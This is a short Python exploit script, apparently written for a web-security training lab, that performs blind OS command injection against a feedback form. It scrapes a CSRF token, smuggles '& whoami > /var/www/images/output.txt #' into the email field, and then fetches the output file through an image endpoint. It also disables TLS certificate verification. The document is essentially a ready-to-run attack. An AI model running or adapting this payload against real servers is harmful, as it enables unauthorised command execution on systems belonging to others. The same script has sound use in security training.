import sys
import requests
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def get_csrf_token(s, url):
    print("(+) Getting csrf token...")
    path = 'feedback'
    req = s.get(url+path, verify=False)
    soup = BeautifulSoup(req.text, 'html.parser')
    csrf = soup.find("input")['value']
    return csrf

def exploit_command_injection(s, url):
    feedback_path = 'feedback/submit'
    command_injection = "test@test.com & whoami > /var/www/images/output.txt #"
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'subject': 'test', 'email': command_injection, 'message': 'test'}
    print("(+) Sending request...")
    s.post(url+feedback_path, verify=False, data=data)
    print("(+) Verifying if command injection exploit worked...")
    
    # verify command injection
    file_path = 'image?filename=output.txt'
    req2 = s.get(url+file_path, verify=False)
    if req2.status_code == 200:
        print("(+) Command injection successful!")
        print("(+) The following is the content of the command: " + req2.text)
    else:
        print("(-) Command injection was not successful.")

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    else:
        url = sys.argv[1]
        s = requests.Session()
        exploit_command_injection(s, url)

if __name__ == "__main__":
    main()